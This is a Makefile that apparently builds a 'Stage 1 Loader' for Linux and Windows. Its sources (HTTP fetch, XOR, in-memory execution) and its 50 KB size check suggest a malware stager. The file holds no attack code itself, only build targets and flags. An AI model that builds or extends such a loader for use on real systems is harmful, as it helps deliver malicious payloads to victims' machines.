# Stage 1 Loader Makefile
#
# Targets:
#   make linux    - Build Linux ELF (default)
#   make windows  - Build Windows PE (requires mingw-w64)
#   make all      - Build both
#   make clean    - Remove build artifacts
#   make check    - Verify size constraint

# Output directory
BUILD_DIR := build

# Source files
SRCS := src/main.c src/xor.c

# Linux-specific sources
LINUX_SRCS := $(SRCS) src/http_linux.c src/mem_exec_linux.c

# Windows-specific sources
WIN_SRCS := $(SRCS) src/http_win.c src/mem_exec_win.c

# Compiler flags for minimal size
COMMON_CFLAGS := -Os -fno-stack-protector -fno-asynchronous-unwind-tables \
                 -fno-ident -fno-exceptions -fdata-sections -ffunction-sections \
                 -Wall -Wextra -Werror -Isrc

# Linux compiler and flags
CC := gcc
LINUX_CFLAGS := $(COMMON_CFLAGS)
LINUX_LDFLAGS := -Wl,--gc-sections -Wl,--strip-all -s

# Windows cross-compiler and flags
MINGW := x86_64-w64-mingw32-gcc
WIN_CFLAGS := $(COMMON_CFLAGS)
WIN_LDFLAGS := -Wl,--gc-sections -s -static -lwinhttp

# Size constraint (50KB)
MAX_SIZE := 51200

# Output names
LINUX_OUT := $(BUILD_DIR)/stage1
WIN_OUT := $(BUILD_DIR)/stage1.exe

.PHONY: all linux windows clean check

all: linux windows

linux: $(BUILD_DIR)
	$(CC) $(LINUX_CFLAGS) $(LINUX_SRCS) -o $(LINUX_OUT) $(LINUX_LDFLAGS)
	@echo "Built: $(LINUX_OUT)"
	@stat -c "Size: %s bytes" $(LINUX_OUT)

windows: $(BUILD_DIR)
	@if command -v $(MINGW) >/dev/null 2>&1; then \
		$(MINGW) $(WIN_CFLAGS) $(WIN_SRCS) -o $(WIN_OUT) $(WIN_LDFLAGS); \
		echo "Built: $(WIN_OUT)"; \
		stat -c "Size: %s bytes" $(WIN_OUT); \
	else \
		echo "SKIP: mingw-w64 not installed (install with: pacman -S mingw-w64-gcc)"; \
	fi

$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

clean:
	rm -rf $(BUILD_DIR)

# Verify size constraint for both builds
check: all
	@echo "Checking size constraints..."
	@LINUX_SIZE=$$(stat -c %s $(LINUX_OUT) 2>/dev/null || echo 0); \
	WIN_SIZE=$$(stat -c %s $(WIN_OUT) 2>/dev/null || echo 0); \
	FAIL=0; \
	if [ "$$LINUX_SIZE" -gt $(MAX_SIZE) ]; then \
		echo "FAIL: Linux binary ($$LINUX_SIZE) exceeds $(MAX_SIZE) bytes"; \
		FAIL=1; \
	else \
		echo "PASS: Linux binary ($$LINUX_SIZE) < $(MAX_SIZE) bytes"; \
	fi; \
	if [ "$$WIN_SIZE" -gt $(MAX_SIZE) ]; then \
		echo "FAIL: Windows binary ($$WIN_SIZE) exceeds $(MAX_SIZE) bytes"; \
		FAIL=1; \
	else \
		echo "PASS: Windows binary ($$WIN_SIZE) < $(MAX_SIZE) bytes"; \
	fi; \
	exit $$FAIL
